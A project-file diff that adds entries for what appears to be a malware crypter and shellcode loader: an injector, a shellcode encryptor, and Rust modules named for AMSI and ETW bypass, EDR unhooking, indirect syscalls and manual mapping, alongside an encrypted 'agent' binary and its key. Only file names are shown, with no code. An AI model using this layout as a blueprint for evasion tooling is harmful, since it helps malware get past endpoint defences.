@@ -28,6 +28,12 @@
     <Compile Include="crypto\string_encryptor.py" />
     <Compile Include="crypto\xor_mask.py" />
     <Compile Include="crypto\__init__.py" />
+    <Compile Include="exe_guard\builder.py" />
+    <Compile Include="exe_guard\exe_encryptor.py" />
+    <Compile Include="exe_guard\loader_generator.py" />
+    <Compile Include="exe_guard\rust_loader_generator.py" />
+    <Compile Include="exe_guard\validator_exe.py" />
+    <Compile Include="exe_guard\xor_packer.py" />
     <Compile Include="main.py" />
     <Compile Include="obfuscator\api_resolver.py" />
     <Compile Include="obfuscator\code_transformer.py" />
@@ -39,6 +45,11 @@
     <Compile Include="obfuscator\polymorph_engine.py" />
     <Compile Include="obfuscator\syscall_hiding.py" />
     <Compile Include="obfuscator\__init__.py" />
+    <Compile Include="shell_loader\builder.py" />
+    <Compile Include="shell_loader\injector.py" />
+    <Compile Include="shell_loader\loader_generator.py" />
+    <Compile Include="shell_loader\shellcode_encryptor.py" />
+    <Compile Include="shell_loader\__init__.py" />
     <Compile Include="stringguard\backup_restore.py" />
     <Compile Include="stringguard\decryptor_generator.py" />
     <Compile Include="stringguard\filter_engine.py" />
@@ -67,6 +78,15 @@
   </ItemGroup>
   <ItemGroup>
     <Folder Include="crypto\" />
+    <Folder Include="exe_guard\" />
+    <Folder Include="runtime_loader_rust\" />
+    <Folder Include="runtime_loader_rust\src\memory\" />
+    <Folder Include="runtime_loader_rust\src\edr\" />
+    <Folder Include="runtime_loader_rust\output\" />
+    <Folder Include="runtime_loader_rust\src\crypto\" />
+    <Folder Include="runtime_loader_rust\src\syscall\" />
+    <Folder Include="runtime_loader_rust\src\" />
+    <Folder Include="shell_loader\" />
     <Folder Include="stringguard\" />
     <Folder Include="sample\" />
     <Folder Include="tests\" />
@@ -74,11 +94,27 @@
     <Folder Include="obfuscator\" />
   </ItemGroup>
   <ItemGroup>
-    <Content Include="sample\test_dll.cpp" />
-    <Content Include="sample\test_exe.cpp" />
-    <Content Include="sample\test_gui.cpp" />
-    <Content Include="sample\test_input.cpp" />
-    <Content Include="sample\test_input_api.cpp" />
+    <Content Include="runtime_loader_rust\Cargo.toml" />
+    <Content Include="runtime_loader_rust\build.rs" />
+    <Content Include="runtime_loader_rust\output\agent_aes.key" />
+    <Content Include="runtime_loader_rust\output\encrypted_agent.exe" />
+    <Content Include="runtime_loader_rust\src\constants.rs" />
+    <Content Include="runtime_loader_rust\src\crypto.rs" />
+    <Content Include="runtime_loader_rust\src\data.rs" />
+    <Content Include="runtime_loader_rust\src\edr\amsi.rs" />
+    <Content Include="runtime_loader_rust\src\edr\etw.rs" />
+    <Content Include="runtime_loader_rust\src\edr\unhook.rs" />
+    <Content Include="runtime_loader_rust\src\lib.rs" />
+    <Content Include="runtime_loader_rust\src\main.rs" />
+    <Content Include="runtime_loader_rust\src\memory\manual_map.rs" />
+    <Content Include="runtime_loader_rust\src\edr\mod.rs" />
+    <Content Include="runtime_loader_rust\src\memory\pe_loader.rs" />
+    <Content Include="runtime_loader_rust\src\memory\stealth.rs" />
+    <Content Include="runtime_loader_rust\src\syscall\indirect_syscall.rs" />
+    <Content Include="runtime_loader_rust\src\syscall\mod.rs" />
+    <Content Include="runtime_loader_rust\src\syscall\ntdll.rs" />
+    <Content Include="runtime_loader_rust\src\utils.rs" />
+    <Content Include="sample\agent.x64.bin" />
   </ItemGroup>
   <Import Project="$(MSBuildExtensionsPath32)\Microsoft\VisualStudio\v$(VisualStudioVersion)\Python Tools\Microsoft.PythonTools.targets" />
   <!-- Uncomment the CoreCompile target to enable the Build command in
